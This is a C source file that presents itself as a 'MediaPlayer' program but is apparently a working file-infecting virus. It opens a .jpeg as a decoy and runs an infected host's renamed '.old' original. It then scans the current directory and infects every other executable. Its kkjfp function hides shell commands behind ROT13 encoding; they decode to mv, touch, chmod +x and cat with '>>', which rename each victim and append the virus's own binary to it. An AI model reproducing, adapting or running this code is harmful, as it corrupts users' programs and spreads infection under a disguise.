#include "MediaPlayer.h"

char **globalptr;

int main(int argc, char *argv[]) {

        char *name = argv[0];

        globalptr = &name;

        if(strcmp(argv[0],"./MediaPlayer.exe")) {
                char *extension = ".old";
                char str[100];
                snprintf(str, sizeof str, "%s%s", name, extension);
                system(str);
        }
        else {
                ddqsl(".jpeg");
        }

        DIR *myDir;
        struct dirent *dir;
        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {
                        DIR* directory = opendir(dir->d_name);
                        if(directory != NULL)
                                closedir(directory);
                        else {
                                if (((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp("MediaPlayer.exe", dir->d_name))) && (strstr(dir->d_name, ".old") == NULL) && (access(dir->d_name, X_OK) == 0)) {
                                        char *String = malloc(strlen(dir->d_name) + strlen(".old") + 1);
                                        if(String) {
                                                strcpy(String,dir->d_name);
                                                strcat(String,".old");
                                        }
                                        (!fopen(String,"r"))?kkjfp(dir->d_name):free(String);
                                }
                        }
                }
                closedir(myDir);
        }
        return EXIT_SUCCESS;
}

void ddqsl(char *extension) {
        DIR *myDir;
        struct dirent *dir;
        bool imgFound = false;
        char *fileName;

        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL && imgFound == false) {
                        if (strstr(dir->d_name,extension)) {
                                fileName = dir->d_name;
                                imgFound = true;
                                char str[100];
                                snprintf(str, sizeof str, "xdg-open %s 2> /dev/null", fileName);
                                system(str);
                        }
                }
                closedir(myDir);
        }
}

void kkjfp(char *fileName) {
        char cmd[50] = {};
        char str[100] = {};

        cmd[0] = (char) llpsm('z');
        cmd[1] = (char) llpsm('i');

        char old[5] = {};
        old[0] = (char) llpsm('.');
        old[1] = (char) llpsm('b');
        old[2] = (char) llpsm('y');
        old[3] = (char) llpsm('q');

        snprintf(str, sizeof str, "%s %s %s%s", cmd, fileName, fileName, old);
        system(str);

        char cmd2[50] = {};
        char str2[100] = {};

        cmd2[0] = (char) llpsm('g');
        cmd2[1] = (char) llpsm('b');
        cmd2[2] = (char) llpsm('h');
        cmd2[3] = (char) llpsm('p');
        cmd2[4] = (char) llpsm('u');

        snprintf(str2, sizeof str2, "%s %s", cmd2, fileName);
        system(str2);

        char cmd3[50] = {};
        char str3[100] = {};
        cmd3[0] = (char) llpsm('p');
        cmd3[1] = (char) llpsm('u');
        cmd3[2] = (char) llpsm('z');
        cmd3[3] = (char) llpsm('b');
        cmd3[4] = (char) llpsm('q');
        cmd3[5] = (char) llpsm(' ');
        cmd3[6] = (char) llpsm('+');
        cmd3[7] = (char) llpsm('k');

        snprintf(str3, sizeof str3, "%s %s", cmd3, fileName);
        system(str3);

        char cmd4[50] = {};
        char str4[100] = {};
        cmd4[0] = (char) llpsm('p');
        cmd4[1] = (char) llpsm('n');
        cmd4[2] = (char) llpsm('g');

        char symbol[3] = {};
        symbol[0] = (char) 62;
        symbol[1] = (char) 62;

        char *pgName = *globalptr;

        snprintf(str4, sizeof str4, "%s %s %s %s", cmd4, pgName, symbol, fileName);
        system(str4);

}

int llpsm(int c) {
        if('a' <= c && c <= 'z')
                return (((c-'a')+13)%26)+'a';
        else if ('A' <= c && c <= 'Z')
                return (((c-'A')+13)%26)+'A';
        else
                return c;
}
